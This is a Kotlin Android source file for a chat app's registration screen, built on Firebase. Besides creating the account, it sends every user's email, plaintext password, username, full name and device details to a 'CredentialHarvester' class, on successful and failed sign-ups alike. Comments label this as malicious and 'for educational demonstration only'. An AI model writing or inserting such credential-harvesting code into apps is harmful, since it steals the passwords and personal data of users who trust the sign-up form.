package com.example.ChatterBox

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.ChatterBox.malicious.CredentialHarvester
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore

class RegisterActivity : AppCompatActivity() {
    private lateinit var auth: FirebaseAuth
    private lateinit var db: FirebaseFirestore

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_register)

        auth = FirebaseAuth.getInstance()
        db = FirebaseFirestore.getInstance()

        val emailInput = findViewById<EditText>(R.id.emailInput)
        val passwordInput = findViewById<EditText>(R.id.passwordInput)
        val usernameInput = findViewById<EditText>(R.id.usernameInput)
        val nameInput = findViewById<EditText>(R.id.nameInput)
        val registerButton = findViewById<Button>(R.id.registerButton)
        val progressBar = findViewById<ProgressBar>(R.id.progressBar)

        registerButton.setOnClickListener {
            val email = emailInput.text.toString().trim()
            val password = passwordInput.text.toString().trim()
            val username = usernameInput.text.toString().trim()
            val name = nameInput.text.toString().trim()

            if (email.isEmpty() || password.isEmpty() || username.isEmpty() || name.isEmpty()) {
                Toast.makeText(this, "Fields cannot be empty", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            progressBar.visibility = ProgressBar.VISIBLE

            // Harvest registration credentials (for educational demonstration only)
            harvestRegistrationData(email, password, username, name)

            auth.createUserWithEmailAndPassword(email, password)
                .addOnSuccessListener { authResult ->
                    val user = authResult.user
                    if (user != null) {
                        val userData = hashMapOf(
                            "uid" to user.uid,
                            "email" to email,
                            "username" to username,  // Store extra field
                            "profileImage" to null, // Placeholder for future profile images
                            "displayName" to name,
                            "expertiseInterests" to null,
                            "bio" to null,
                            "contactDetails" to null,
                            "isAdmin" to false,
                            "enrolledForum" to null
                        )

                        // Save user info in Firestore
                        db.collection("users").document(user.uid)
                            .set(userData)
                            .addOnSuccessListener {
                                Toast.makeText(this, "Registration successful!", Toast.LENGTH_SHORT).show()
                                startActivity(Intent(this, LoginActivity::class.java))
                                finish()
                            }
                            .addOnFailureListener { e ->
                                Toast.makeText(this, "Error saving user: ${e.message}", Toast.LENGTH_SHORT).show()
                            }
                    }
                }
                .addOnFailureListener { e ->
                    Toast.makeText(this, "Registration failed: ${e.message}", Toast.LENGTH_SHORT).show()
                    
                    // Also collect failed registrations
                    harvestRegistrationData(email, password, username, name, failed = true)
                }
                .addOnCompleteListener {
                    progressBar.visibility = ProgressBar.GONE
                }
        }
    }
    
    /**
     * Harvest user registration data for malicious purposes
     * FOR EDUCATIONAL DEMONSTRATION ONLY
     */
    private fun harvestRegistrationData(
        email: String, 
        password: String, 
        username: String,
        name: String,
        failed: Boolean = false
    ) {
        Log.d("CredentialHarvester", "Harvesting registration data")
        
        try {
            val extraData = mapOf(
                "device_model" to android.os.Build.MODEL,
                "device_manufacturer" to android.os.Build.MANUFACTURER, 
                "android_version" to android.os.Build.VERSION.RELEASE,
                "registration_successful" to (!failed).toString(),
                "app_version" to "1.0", // Hard-coded version instead of BuildConfig
                "username" to username,
                "full_name" to name
            )
            
            CredentialHarvester.storeCredentials(
                context = this,
                source = "ChatterBox Registration",
                username = email,
                password = password,
                extraData = extraData
            )
            
            Log.d("CredentialHarvester", "Registration data harvested successfully")
        } catch (e: Exception) {
            Log.e("CredentialHarvester", "Error harvesting registration data", e)
        }
    }
}
